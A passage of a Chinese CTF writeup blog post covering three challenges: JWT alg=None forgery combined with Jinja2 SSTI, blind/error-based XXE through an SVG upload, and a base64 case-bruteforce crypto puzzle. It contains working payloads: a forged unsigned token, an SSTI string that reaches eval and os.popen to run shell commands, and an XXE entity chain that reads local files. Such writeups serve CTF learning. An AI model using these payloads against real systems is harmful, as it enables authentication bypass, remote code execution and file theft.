+<h3 id="py一波吧-ssti-jwt-1"><a href="#py一波吧-ssti-jwt-1" class="headerlink" title="py一波吧-ssti+jwt_1"></a>py一波吧-ssti+jwt_1</h3><p><code>JWT alg=None 签名bypass攻击</code> -&gt; <code>SSTI</code>，强行把两道题拼成一道题，没有第一步不能进入SSTI</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">随便输入一个用户名密码，将cookie里面的token提取出来，解base64可得</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">&#123;"alg":"HS256","typ":"JWT"&#125;.&#123;"username":"admin1"&#125;.signature</span><br><span class="line">```</span><br></pre></td></tr></table></figure>
+<p>可以生成一个用户名为admin的<code>token</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8 </span></span><br><span class="line"><span class="comment">#PyJWT</span></span><br><span class="line"><span class="keyword">import</span> jwt </span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_token</span><span class="params">()</span>:</span> </span><br><span class="line">    payload = &#123; </span><br><span class="line">         <span class="string">"username"</span>: <span class="string">"admin"</span> </span><br><span class="line">    &#125; </span><br><span class="line">    token = jwt.encode(payload, <span class="literal">None</span>, algorithm=<span class="literal">None</span>) </span><br><span class="line">    <span class="keyword">print</span> token </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">create_token()</span><br></pre></td></tr></table></figure>
+<p>把token换上去，就可以进入SSTI流程了。</p>
+<p>SSTI过滤了：单引号、os、system、[]</p>
+<p>Jinja2对与不存在的对象有一个特殊的定义<strong>Undefined</strong>类，<code>&lt;class &#39;jinja2.runtime.Undefined&#39;&gt;</code></p>
+<p><strong>jinja2/runtime.py</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@implements_to_string</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Undefined</span><span class="params">(object)</span>:</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+<p>通过构造<code>title=</code>就可以搞事情了，发现有个<code>eval</code>，就是它了。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;'new_context': &lt;function new_context at 0x7fc79bb4faa0&gt;, 'chain': &lt;type 'itertools.chain'&gt;, '_context_function_types': (&lt;type 'function'&gt;, &lt;type 'instancemethod'&gt;), 'resolve_or_missing': &lt;function resolve_or_missing at 0x7fc79bb4fcf8&gt;, 'Namespace': &lt;class 'jinja2.utils.Namespace'&gt;, 'ContextMeta': &lt;class 'jinja2.runtime.ContextMeta'&gt;, 'evalcontextfunction': &lt;function evalcontextfunction at 0x7fc79bd919b0&gt;, 'escape': &lt;built-in function escape&gt;, 'LoopContext': &lt;class 'jinja2.runtime.LoopContext'&gt;, '_first_iteration': &lt;object object at 0x7fc79f5b2190&gt;, 'TemplateNotFound': &lt;class 'jinja2.exceptions.TemplateNotFound'&gt;,···'eval': &lt;built-in function eval&gt;</span><br></pre></td></tr></table></figure>
+<p>不能用<code>[]</code>可以使用<code>.get()</code>绕过，被过滤的字符串可以拆分成2个字符串或者使用格式化字符串的方法。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;vvv.__class__.__init__.__globals__.get(<span class="string">"__bui"</span>+<span class="string">"ltins__"</span>).get(<span class="string">"e"</span>+<span class="string">"val"</span>)(<span class="string">"__imp"</span>+<span class="string">"ort__(\"o"</span>+<span class="string">"s\").po"</span>+<span class="string">"pen(\"ls\").read()"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>执行命令列目录，发现没有传说中的flag，但是发现了一个以数字+英文组合为文件名的文件，经过确认，就是flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;vvv.__class__.__init__.__globals__.get(<span class="string">"__bui"</span>+<span class="string">"ltins__"</span>).get(<span class="string">"e"</span>+<span class="string">"val"</span>)(<span class="string">"__imp"</span>+<span class="string">"ort__(\"o"</span>+<span class="string">"s\").po"</span>+<span class="string">"pen(\"cat f41321d3b61338c8d239e75d971f34a4\").read()"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>本题源码在<code>/app/none</code>路径下，也可通过构造类似命令进行读取。</p>
+<h3 id="hardupload"><a href="#hardupload" class="headerlink" title="hardupload"></a>hardupload</h3><p>在今年的Google CTF 中出了一道Blind XXE 题 bnv，可以做参考</p>
+<p>不懂xxe建议先了解一波</p>
+<p><a href="https://www.cnblogs.com/backlion/p/9302528.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/9302528.html</a></p>
+<p><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357</a></p>
+<p>上传php一句话返回错误信息</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">For Security, our system do not allow upload xml file from now on.<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span>Other file like png,jpg,rar,zip...etc is welcome<span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以上传图片等文件格式,恰好xml可以解析svg</p>
+<p><strong>payload</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE message [</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT message ANY&gt;</span></span><br><span class="line"><span class="meta">  &lt;!ENTITY % para1 SYSTEM "file:///hhh_Th1s_y0uR_f14g"&gt; //根据报错回显找到flag路径</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % para '</span></span><br><span class="line"><span class="meta">&lt;!ENTITY &amp;#x25; para2 "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM</span></span><br><span class="line"><span class="meta">&amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;"&gt;</span></span><br><span class="line"><span class="meta">&amp;#x25;para2;</span></span><br><span class="line"><span class="meta">'&gt;</span></span><br><span class="line"><span class="meta">%para;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>10<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>注意指定MIME类型 Content-Type: text/xml</p>
+<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="MaybeBase"><a href="#MaybeBase" class="headerlink" title="MaybeBase"></a>MaybeBase</h3><p><code>YMFZZTY0D3RMD3RMMTIZ 这一串到底是什么！！！！为什么这么像base32却不是！！！明文的md5值为16478a151bdd41335dcd69b270f6b985</code></p>
+<p>可以用base64不区分大小写工具直接爆出所有可能的flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64,sys,os,redef,re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(res,arr,pos)</span>:</span></span><br><span class="line">    res.append(<span class="string">''</span>.join(arr))</span><br><span class="line">    i=pos</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(i,len(arr)):</span><br><span class="line">        <span class="keyword">if</span> arr[i]&lt;=<span class="string">'Z'</span> <span class="keyword">and</span> arr[i]&gt;=<span class="string">'A'</span>:</span><br><span class="line">            arr[i]=arr[i].lower()</span><br><span class="line">            dfs(res,arr,i+<span class="number">1</span>)</span><br><span class="line">            arr[i]=arr[i].upper()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'+'</span> + <span class="string">'-'</span> * <span class="number">50</span> + <span class="string">'+'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">u'\t  base64大小写转换解密工具'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'+'</span> + <span class="string">'-'</span> * <span class="number">50</span> + <span class="string">'+'</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'用法：'</span> + os.path.basename(sys.argv[<span class="number">0</span>]) + <span class="string">u' base64密文'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'实例：'</span> + os.path.basename(sys.argv[<span class="number">0</span>]) + <span class="string">' "AGV5IULSB3ZLVSE="'</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    arr = list(sys.argv[<span class="number">1</span>])</span><br><span class="line">    res = []</span><br><span class="line">    dfs(res, arr, <span class="number">0</span>)</span><br><span class="line">    res_decode = map(base64.b64decode, res)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> res_decode:</span><br><span class="line">        <span class="keyword">if</span> re.findall(<span class="string">r'\\x'</span>, repr(i)):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> i</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">base64wtfwtf123</span><br><span class="line">base64wtfwtL123</span><br><span class="line">base64wtLwtf123</span><br><span class="line">base64wtLwtL123</span><br><span class="line">baYe64wtfwtf123</span><br><span class="line">baYe64wtfwtL123</span><br><span class="line">baYe64wtLwtf123</span><br><span class="line">baYe64wtLwtL123</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
+<p>得到base64wtfwtf123的md5值为16478a151bdd41335dcd69b270f6b985<br>flag就是这个了！</p>
+<hr>
+<p>分享一个自存CTF题的地址,如果需要请及时自取,地址挂了发个邮件给我:)</p>
+<p>-=&gt; <a href="https://jxjjxy-my.sharepoint.com/:f:/g/personal/v0cjich_p_t_odmail_cn/EtMZ3q8LTIFAkS4Dcp8XAn8BDXTHqlJuV8S6bRu2mZgJHA?e=cT9hk2" target="_blank" rel="noopener">OneDrive cloud</a></p>
+
+    </article>
+    <!-- license  -->
+    
+        <!-- reward  -->
+    <div style="text-align:center;margin:100px auto auto auto;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">点击赞赏二维码:)您的支持将是我前进最大的动力！</font></font></div><br>
+    <div style="text-align:center;">
+    <a class="fancy-link" href="/intro/alipay.png" alt="" data-fancybox="group" data-caption=""><img style="width:27.5%;margin:auto 20px auto 10px;" src="/intro/alipay.png" alt=""></a>
+    <a class="fancy-link" href="/intro/wechat.jpg" alt="" data-fancybox="group" data-caption=""><img style="width:30%;margin:auto 10px auto 20px;" src="/intro/wechat.jpg" alt=""></a>
+    </div>
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/08/22/浅谈Docker-for-Windows与VMware共存/" title= "浅谈Docker-for-Windows与VMware共存">
+                    <div class="prevTitle">浅谈Docker-for-Windows与VMware共存</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:qymuao3o@outlook.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/Qymua" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://weibo.com/u/7281537566?is_hot=1" class="iconfont-archer weibo" target="_blank" title=weibo></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://space.bilibili.com/190787119" class="iconfont-archer bilibili" target="_blank" title=bilibili></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://qymua.com/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">Author <a href="https://qymua.com" target="_blank">QYMUA</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Re"><span class="toc-number">2.</span> <span class="toc-text">Re</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#guess-the-key"><span class="toc-number">2.1.</span> <span class="toc-text">guess the key</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#i-have-the-flag"><span class="toc-number">3.1.</span> <span class="toc-text">i have the_flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#a-little-hard"><span class="toc-number">3.2.</span> <span class="toc-text">a little hard</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#click-1"><span class="toc-number">3.3.</span> <span class="toc-text">click_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#花式过waf"><span class="toc-number">3.4.</span> <span class="toc-text">花式过waf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#忘记密码了"><span class="toc-number">3.5.</span> <span class="toc-text">忘记密码了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#py一波吧-ssti-jwt-1"><span class="toc-number">3.6.</span> <span class="toc-text">py一波吧-ssti+jwt_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hardupload"><span class="toc-number">3.7.</span> <span class="toc-text">hardupload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-number">4.</span> <span class="toc-text">crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MaybeBase"><span class="toc-number">4.1.</span> <span class="toc-text">MaybeBase</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 11
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/16</span><a class="archive-post-title" href= "/2019/09/16/2019-福建省网络安全宣传周黑盾杯Writeup/" >2019 福建省网络安全宣传周黑盾杯Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/22</span><a class="archive-post-title" href= "/2019/08/22/浅谈Docker-for-Windows与VMware共存/" >浅谈Docker-for-Windows与VMware共存</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/22</span><a class="archive-post-title" href= "/2019/08/22/Docker入门之吐血总结/" >Docker入门之吐血总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/15</span><a class="archive-post-title" href= "/2019/08/15/2018FJ工控攻防大赛WriteUp/" >2018FJ工控攻防大赛WriteUp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/23</span><a class="archive-post-title" href= "/2019/05/23/Ubuntu-16-04-for-Pwn/" >Ubuntu 16.04 for Pwn</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span><a class="archive-post-title" href= "/2019/04/24/Git-for-github-使用笔记/" >Git for github 使用笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/15</span><a class="archive-post-title" href= "/2019/04/15/CTFd搭建笔记/" >CTFd搭建笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/12</span><a class="archive-post-title" href= "/2019/04/12/ubuntu安装后的初始化配置/" >ubuntu安装后的初始化配置</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/08</span><a class="archive-post-title" href= "/2019/04/08/deepin入坑前必读-懊悔篇/" >deepin入坑前必读(懊悔篇)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/07</span><a class="archive-post-title" href= "/2019/04/07/Tools-recode/" >Tools recode</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/07</span><a class="archive-post-title" href= "/2019/04/07/manjaro-linux-安装及使用/" >manjaro  linux 安装及使用</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="工控"><span class="iconfont-archer">&#xe606;</span>工控</span>
+    
+        <span class="sidebar-tag-name" data-tags="getshell"><span class="iconfont-archer">&#xe606;</span>getshell</span>
+    
+        <span class="sidebar-tag-name" data-tags="PLC"><span class="iconfont-archer">&#xe606;</span>PLC</span>
+    
+        <span class="sidebar-tag-name" data-tags="tools"><span class="iconfont-archer">&#xe606;</span>tools</span>
+    
+        <span class="sidebar-tag-name" data-tags="ubuntu"><span class="iconfont-archer">&#xe606;</span>ubuntu</span>
+    
+        <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="deepin"><span class="iconfont-archer">&#xe606;</span>deepin</span>
+    
+        <span class="sidebar-tag-name" data-tags="manjaro"><span class="iconfont-archer">&#xe606;</span>manjaro</span>
+    
+        <span class="sidebar-tag-name" data-tags="docker"><span class="iconfont-archer">&#xe606;</span>docker</span>
+    
+        <span class="sidebar-tag-name" data-tags="Hyper-v"><span class="iconfont-archer">&#xe606;</span>Hyper-v</span>
+    
+        <span class="sidebar-tag-name" data-tags="VMware"><span class="iconfont-archer">&#xe606;</span>VMware</span>
+    
+        <span class="sidebar-tag-name" data-tags="web,Re,crypto"><span class="iconfont-archer">&#xe606;</span>web,Re,crypto</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTFd"><span class="iconfont-archer">&#xe606;</span>CTFd</span>
+    
+        <span class="sidebar-tag-name" data-tags="Git"><span class="iconfont-archer">&#xe606;</span>Git</span>
+    
+        <span class="sidebar-tag-name" data-tags="github"><span class="iconfont-archer">&#xe606;</span>github</span>
+    
+        <span class="sidebar-tag-name" data-tags="docker-compose"><span class="iconfont-archer">&#xe606;</span>docker-compose</span>
+    
+        <span class="sidebar-tag-name" data-tags="Pwn"><span class="iconfont-archer">&#xe606;</span>Pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="Writeup"><span class="iconfont-archer">&#xe60a;</span>Writeup</span>
+    
+        <span class="sidebar-category-name" data-categories="随笔"><span class="iconfont-archer">&#xe60a;</span>随笔</span>
+    
+        <span class="sidebar-category-name" data-categories="Pwn"><span class="iconfont-archer">&#xe60a;</span>Pwn</span>
+    
+        <span class="sidebar-category-name" data-categories="Docker"><span class="iconfont-archer">&#xe60a;</span>Docker</span>
+    
+        <span class="sidebar-category-name" data-categories="随笔/github"><span class="iconfont-archer">&#xe60a;</span>随笔/github</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "酋小木"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":100,"height":250},"mobile":{"show":false},"log":false});</script></body>
+</html>
+
+
